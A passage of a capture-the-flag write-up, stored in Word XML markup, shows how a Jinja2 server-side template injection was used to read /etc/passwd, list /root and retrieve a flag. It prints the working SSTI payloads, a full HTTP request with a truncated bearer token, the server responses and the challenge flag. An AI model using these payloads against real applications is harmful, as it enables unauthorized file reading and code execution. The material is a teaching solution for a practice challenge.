        <w:t>Jinja2 Server-Side Template Injection (SSTI)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>**Why this works:** The server is using Jinja2 templates and directly rendering user input without sanitization. The double curly braces `{{ }}` are Jinja2's expression delimiters, allowing us to inject arbitrary Python expressions.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Step 7: Exploiting SSTI for Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Now we need to escape the template sandbox and execute arbitrary Python code. We'll use the classic Jinja2 SSTI payload to access Python's built-in functions.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7.1: Accessing Global Context</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>To escape the template sandbox, we need to access Python's built-in functions. We use the classic Jinja2 SSTI payload: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const message = "{{ self.__init__.__globals__ }}";</w:t>
        <w:br/>
        <w:t>const checksum = window.hyperpulseChecksum(message, token);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>This payload works by:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - References the current template context</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Accesses the initialization method</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>__globals__</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Accesses the global namespace containing all imported modules and built-ins</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The response reveals the global context, confirming we're in a Jinja2 environment with access to Python built-ins like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>__import__</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7.2: Reading Files</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">We can use Python's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>open()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> function to read files: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const message = "{{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}";</w:t>
        <w:br/>
        <w:t>const checksum = window.hyperpulseChecksum(message, token);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response snippet:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>root:x:0:0:root:/root:/bin/bash</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>orbital:x:1000:1000::/home/orbital:/bin/sh</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7.3: Listing Root Directory</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Let's check what's in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/root</w:t>
      </w:r>
      <w:r>
        <w:t>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const message = "{{ self.__init__.__globals__['__builtins__']['__import__']('os').listdir('/root') }}";</w:t>
        <w:br/>
        <w:t>const checksum = window.hyperpulseChecksum(message, token);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "result": "['.bashrc', '.profile', 'flag.txt', '.python_history', '.wget-hsts']"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Perfect! There's a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>flag.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/root</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7.4: Reading the Flag</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Now we read the flag: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const message = "{{ self.__init__.__globals__['__builtins__']['open']('/root/flag.txt').read() }}";</w:t>
        <w:br/>
        <w:t>const checksum = window.hyperpulseChecksum(message, token);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Final Request:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>POST /api/admin/hyperpulse HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 15.206.47.5:8443</w:t>
        <w:br/>
        <w:t>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"message":"{{ self.__init__.__globals__['__builtins__']['open']('/root/flag.txt').read() }}","checksum":"0f98c5e2"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: Final Burp Request - burp-final.png]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Final SSTI payload to read the flag*</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "reference": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "now": "2025-12-14T04:44:58.526330",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "pilot": "Nova-17",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "systems": ["Life Support", "Payload Bay", "Thermal Shields"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "result": "ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}\n"</w:t>
        <w:br/>
        <w:t>}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Flag</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}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Resources Used</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[JWT Tool](https://github.com/ticarpi/jwt_tool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[Jinja2 SSTI Payloads](https://github.com/payloadbox/ssti-payloads)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